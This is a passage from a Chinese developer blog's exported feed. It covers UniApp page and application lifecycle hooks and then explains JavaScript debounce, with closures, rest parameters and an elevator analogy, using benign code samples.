class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">onPullDownRefresh</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"用户触发了下拉刷新"</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 模拟数据请求</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">fetchData</span><span style="color: #D4D4D4">(() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 数据加载完成后，停止下拉刷新</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">uni</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">stopPullDownRefresh</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">    });</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">methods:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">fetchData</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">callback</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 这里可以调用 API 或执行其他操作来获取新数据</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">setTimeout</span><span style="color: #D4D4D4">(() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"数据刷新完成"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">callback</span><span style="color: #D4D4D4"> &amp;&amp; </span><span style="color: #DCDCAA">callback</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">      }, </span><span style="color: #B5CEA8">2000</span><span style="color: #D4D4D4">); </span><span style="color: #6A9955">// 模拟延迟</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">};</span></span></code></pre></div></div></figure><p>在 UniApp 中，<code>onReachBottom()</code> 默认是在页面滚动到离底部 50px 位置时触发。不过在 <code>pages.json</code> 文件中，可以配置 <code>onReachBottomDistance</code> 属性来调整触底的距离。这个属性指定了页面滚动到底部时触发 <code>onReachBottom()</code> 事件的距离（单位 px）。例如，将触底距离设为 150px</p><figure class="shiki json"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"path"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"goods_list/goods_list"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"style"</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"enablePullDownRefresh"</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"onReachBottomDistance"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">150</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><h3 id="7-onreachbottom"><a class="markdownIt-Anchor" href="#7-onreachbottom"></a> 7、onReachBottom()</h3><ul><li>页面上拉触底事件的处理函数。</li><li>用户上拉到页面底部时触发，常用于加载更多数据的场景。</li></ul><h3 id="8-onpagescrollobject"><a class="markdownIt-Anchor" href="#8-onpagescrollobject"></a> 8、onPageScroll(object</h3><ul><li>页面滚动时触发，可以获取页面的滚动距离。</li></ul><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">onPageScroll</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">event</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'页面滚动'</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">event</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">scrollTop</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><h3 id="9-onshareappmessage"><a class="markdownIt-Anchor" href="#9-onshareappmessage"></a> 9、onShareAppMessage()</h3><ul><li>用户点击右上角分享时触发，返回自定义的分享内容。</li></ul><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">onShareAppMessage</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">title:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'分享标题'</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">path:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'/pages/index/index'</span></span><span class="line"><span style="color: #D4D4D4">  };</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><h2 id="应用程序生命周期"><a class="markdownIt-Anchor" href="#应用程序生命周期"></a> 应用程序生命周期</h2><p>这些生命周期钩子是针对整个应用程序的，在不同的应用场景下会被触发。</p><h3 id="1-onlaunch"><a class="markdownIt-Anchor" href="#1-onlaunch"></a> 1、onLaunch()</h3><ul><li>当应用首次启动时触发，通常用于执行一些全局的初始化操作。</li></ul><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">onLaunch</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">options</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'应用启动'</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><h3 id="2-onshow-2"><a class="markdownIt-Anchor" href="#2-onshow-2"></a> 2、onShow()</h3><ul><li>当应用从后台进入前台显示时触发。</li><li>类似页面生命周期中的 <code>onShow</code>，但是作用于整个应用。</li></ul><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">onShow</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">options</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'应用显示'</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><h3 id="3-onhide"><a class="markdownIt-Anchor" href="#3-onhide"></a> 3、onHide()</h3><ul><li>当应用进入后台时触发。</li><li>可以在这里处理数据保存、暂停定时器等操作。</li></ul><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">onHide</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'应用隐藏'</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><h3 id="4-onerror"><a class="markdownIt-Anchor" href="#4-onerror"></a> 4、onError()</h3><ul><li>当应用发生 JavaScript 错误时触发。</li><li>常用于全局错误监控。</li></ul><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">onError</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">err</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">error</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'应用出错'</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">err</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><h3 id="5-onpagenotfound"><a class="markdownIt-Anchor" href="#5-onpagenotfound"></a> 5、onPageNotFound()</h3><ul><li>当页面路径不存在时触发，通常用于重定向到一个有效页面。</li></ul><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">onPageNotFound</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">res</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">uni</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">redirectTo</span><span style="color: #D4D4D4">({</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">url:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'/pages/404/404'</span></span><span class="line"><span style="color: #D4D4D4">  });</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><h2 id="小程序平台专属生命周期"><a class="markdownIt-Anchor" href="#小程序平台专属生命周期"></a> 小程序平台专属生命周期</h2><h3 id="1-onresize小程序平台专属"><a class="markdownIt-Anchor" href="#1-onresize小程序平台专属"></a> 1、onResize ()（小程序平台专属）</h3><ul><li>当小程序窗口尺寸发生变化时触发，通常在设备旋转时使用。</li></ul><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">onResize</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">size</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'窗口尺寸变化'</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">size</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><h3 id="2-ontabitemtapitem小程序平台专属"><a class="markdownIt-Anchor" href="#2-ontabitemtapitem小程序平台专属"></a> 2、onTabItemTap (item)（小程序平台专属）</h3><ul><li>监听 tab 页点击的事件。</li></ul><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">onTabItemTap</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'Tab 被点击'</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p>此笔记随时可能更新，总感觉还是见得少了……</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> uni-app </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>理解防抖</title>
      <link href="/posts/35829.html"/>
      <url>/posts/35829.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="description" content="A brief exploration of the debounce function in Vue and JavaScript."><meta name="description" content="对 Vue 项目中的防抖功能的浅略探讨"><h2 id="为什么需要防抖"><a class="markdownIt-Anchor" href="#为什么需要防抖"></a> 为什么需要防抖</h2><p>防抖主要应用在一些高频率触发的事件中，比如：<code>scroll</code> 滚动、<code>input</code> 输入、<code>resize</code> 缩放等，能显著降低性能开销。</p><h2 id="什么是防抖"><a class="markdownIt-Anchor" href="#什么是防抖"></a> 什么是防抖</h2><p>防抖的核心思想是：高频率触发的事件中，仅保留最后一次操作，之前的操作都会被取消。</p><p>举例来说，当你在页面中不断滚动，防抖函数会等待设定的一段时间，如果这段时间内没有再次触发滚动，才会执行处理逻辑；否则会重新计时，直到用户 “安静下来” 再执行操作。</p><p>防抖函数的一般形式如下：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">debounce</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">fn</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">delay</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// fn为传入的函数名</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">let</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">timer</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">null</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 用来保存定时器的 ID</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> (...</span><span style="color: #9CDCFE">args</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 返回一个闭包函数</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">timer</span><span style="color: #D4D4D4">) </span><span style="color: #DCDCAA">clearTimeout</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">timer</span><span style="color: #D4D4D4">); </span><span style="color: #6A9955">// 若已有定时器则清除它</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">timer</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">setTimeout</span><span style="color: #D4D4D4">(() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 设置一个新的定时器</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 当延时结束时，执行传入的函数，并绑定当前的上下文和参数</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">fn</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">apply</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">args</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    }, </span><span style="color: #9CDCFE">delay</span><span style="color: #D4D4D4">); </span><span style="color: #6A9955">// delay 是等待的时间，单位是毫秒 ms</span></span><span class="line"><span style="color: #D4D4D4">  };</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><h2 id="使用示例"><a class="markdownIt-Anchor" href="#使用示例"></a> 使用示例</h2><p>假设我们有一个函数 <code>handleScroll</code>，它在页面滚动时处理一些操作，我们不希望它每次滚动都触发，因为这会增加不必要的性能消耗，我们希望它在滚动停止后执行，那么可以这样使用防抖函数</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">handleScroll</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"处理滚动事件中..."</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 实际逻辑略</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 使用防抖包装滚动事件处理函数，等待300毫秒</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">debouncedHandleScroll</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">debounce</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">handleScroll</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">300</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 当页面滚动时</span></span><span class="line"><span style="color: #9CDCFE">window</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">addEventListener</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"scroll"</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">debouncedHandleScroll</span><span style="color: #D4D4D4">);</span></span></code></pre></div></div></figure><p>这样处理后，滚动事件停止 300ms 后才会触发 <code>handleScroll</code>，大大减少了触发频率。</p><h2 id="理解防抖函数"><a class="markdownIt-Anchor" href="#理解防抖函数"></a> 理解防抖函数</h2><p>每次触发 <code>debounce</code> 返回的函数时：</p><ol><li>如果存在旧的定时器，则先清除；</li><li>然后设置一个新的定时器；</li><li>只有在用户停止触发事件一段时间后，才执行原始函数。</li></ol><p>换句话说：</p><p><strong>多次触发事件时，只有最后一次触发后的延迟时间结束后才会执行目标函数。</strong></p><h2 id="什么是-timer"><a class="markdownIt-Anchor" href="#什么是-timer"></a> 什么是 timer？</h2><p><code>timer</code> 是由 <code>setTimeout</code> 返回的定时器标识符，用来取消未完成的定时任务。</p><p>具体来说，setTimeout 的返回值是一个定时器的标识符 <code>ID</code>。而定时器的 ID 的类型因环境不同也有所差异：在浏览器环境中，setTimeout 的返回是一个数值类型的 ID，例如第一次调用可能返回 1，第二次为 2，依次递增；在 Node.js 环境中，setTimeout 返回值可能是一个定时器对象，但仍然可以通过 clearTimeout 消除。当然也可以将 timer 写作别的名称，只要合法都行，但为了直观还是建议写成 timer</p><h2 id="为什么要每次清除旧定时器"><a class="markdownIt-Anchor" href="#为什么要每次清除旧定时器"></a> 为什么要每次清除旧定时器？</h2><p>如果不清除旧的定时器，每次事件触发都会设置一个新的定时器，导致多个定时器同时生效，函数可能会被多次调用，完全违背了 “只执行最后一次” 的目的。</p><p>现在，假设每次开始都清除定时器，那么当前的滑动事件会将上一次的滑动事件定时清除，并为自己这一次的滑动事件进行定时，而这一次若为最后一次，函数将不再会被调用，也就不再会清除定时器，这一次的事件将会被正确的以设置好的时间定时进行处理。</p><h3 id="电梯门的防抖类比"><a class="markdownIt-Anchor" href="#电梯门的防抖类比"></a> 电梯门的防抖类比</h3><p>这种事件可以类比生活中的乘电梯事件：将电梯门看作事件处理函数，进入电梯的这一动作看作不希望的高频次事件。当人按下电梯按钮，电梯抵达并开门，开门的同时开始计时，每有一个人被红外检测到，人经过电梯门进入电梯之后，电梯门的计时就重新开始（清除上一次的计时），直到没有人进入（高频次事件停止，进入电梯的最后一个人为最后的事件），电梯门最终关闭（定时器时间到了），电梯执行上升或下降等约定好的操作（执行回调函数）。</p><p>即：</p><ol><li>每当一个人进入电梯，门会重新计时关门；</li><li>如果不断有人进来，门就不会关；</li><li>直到没人再进来，计时器才不会被清除，门会在设定时间后关闭。</li></ol><p>这个<strong>直到没人再进来</strong>的延迟，就是防抖的关键。</p><h2 id="为什么不将-timer-写在外部为什么返回一个闭包函数"><a class="markdownIt-Anchor" href="#为什么不将-timer-写在外部为什么返回一个闭包函数"></a> 为什么不将 timer 写在外部？为什么返回一个闭包函数？</h2><p><code>timer</code> 在功能上看，当然可以作为全局变量定义在整个函数外部，但是这样一来如果别处也要使用 <code>timer</code> 就会显得不太合适，<code>timer</code> 会被污染，不便于函数的封装复用，并且还存在安全问题，将其私有化是一个好的选择。</p><p>此外闭包可以记录外部变量的状态（这主要依靠作用域链），这样能保证多次触发事件访问到的是<strong>同一个</strong><code>timer</code>，保证多次事件触发能清除到<strong>前一个事件</strong>的定时，最终实现防抖。</p><h2 id="这闭包到底是啥"><a class="markdownIt-Anchor" href="#这闭包到底是啥"></a> 这闭包到底是啥？</h2><p><strong>闭包</strong>（closure）是 JavaScript 中一个重要的概念，<strong>闭包</strong>是指一个函数可以访问它外部函数作用域中的变量，即使在外部函数已经执行结束后，它仍然可以通过引用这些变量。</p><p>什么意思呢？假设有这样一个函数</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">createCounter</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">let</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">count</span><span style="color: #D4D4D4"> = </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">count</span><span style="color: #D4D4D4"> += </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">count</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  };</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">counter</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">createCounter</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #DCDCAA">counter</span><span style="color: #D4D4D4">()); </span><span style="color: #6A9955">// 输出 1</span></span><span class="line"><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #DCDCAA">counter</span><span style="color: #D4D4D4">()); </span><span style="color: #6A9955">// 输出 2</span></span><span class="line"><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #DCDCAA">counter</span><span style="color: #D4D4D4">()); </span><span style="color: #6A9955">// 输出 3</span></span></code></pre></div></div></figure><p>按理说一个函数 return 之后函数本身就已经 over 了，但是 counter 还是能够访问到 count 的值，并进行了累加。类似这样的一个返回的函数就是闭包。闭包一般是在<strong>函数嵌套</strong>的情况下形成的。当一个函数 <code>A</code> 返回另一个内部函数 <code>B</code>，并且 <code>B</code> 可以访问 <code>A</code> 函数内部定义的变量时，闭包就形成了。</p><h2 id="args是什么为什么"><a class="markdownIt-Anchor" href="#args是什么为什么"></a> <code>...args</code> 是什么？为什么？</h2><p>在 JavaScript 中，<code>...args</code> 是一种称为 <strong>剩余参数（Rest Parameters）</strong> 的语法，它用于将函数的<strong>不定数量的参数</strong>收集到一个数组中。这样可以让函数接受任意数量的参数，并将它们组合在一起，便于操作和处理。</p><p>说到为什么要使用它，还得说说它的好处。假设有这样一个函数</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">logArguments</span><span style="color: #D4D4D4">(...</span><span style="color: #9CDCFE">args</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">args</span><span style="color: #D4D4D4">); </span><span style="color: #6A9955">// args 是一个数组，包含了所有传入的参数</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #DCDCAA">logArguments</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">2</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">3</span><span style="color: #D4D4D4">); </span><span style="color: #6A9955">// 输出 [1, 2, 3]</span></span><span class="line"><span style="color: #DCDCAA">logArguments</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"a"</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">"b"</span><span style="color: #D4D4D4">); </span><span style="color: #6A9955">// 输出 ["a", "b"]</span></span><span class="line"><span style="color: #DCDCAA">logArguments</span><span style="color: #D4D4D4">(); </span><span style="color: #6A9955">// 输出 []</span></span></code></pre></div></div></figure><p>不论传入多少参数，有还是没有，它都能够接收并存储在 <code>args</code> 数组中。</p><p>那为什么防抖中要用到呢？</p><p>一来是为了使得函数能够处理任意数量的参数，使其更通用；二来是为了能够<strong>正确</strong>地传递参数。</p><p>可别不以为意，有时候还真没多少人能正确地传递参数。</p><h2 id="节流"><a class="markdownIt-Anchor" href="#节流"></a> 节流</h2><div class="note warning flat"><p>⚠️ 防抖（debounce）和节流（throttle）经常被搞混：</p><ul><li>防抖：N 秒内事件不断触发，只执行最后一次（停止触发 N 秒后执行）</li><li>节流：N 秒内只执行一次（无论触发多少次，都限制频率）</li></ul></div><h3 id="节流适用场景"><a class="markdownIt-Anchor" href="#节流适用场景"></a> 节流适用场景</h3><ul><li>无限滚动分页加载</li><li>页面滚动触发动画</li><li>鼠标移动实时反馈等</li></ul><h2 id="防抖变种立即执行immediate"><a class="markdownIt-Anchor" href="#防抖变种立即执行immediate"></a> 防抖变种：立即执行（<code>immediate</code>）</h2><p>上述讨论的是 “<strong>非立即执行的防抖</strong>”，即：<strong>等事件不再触发后才执行一次</strong>。</p><p>有时我们希望<strong>首次触发立即执行函数</strong>，后续触发不再响应，直到一段时间之后再允许触发，这就属于 “<strong>立即执行防抖</strong>”。例如：</p><figure class="shiki js"><div 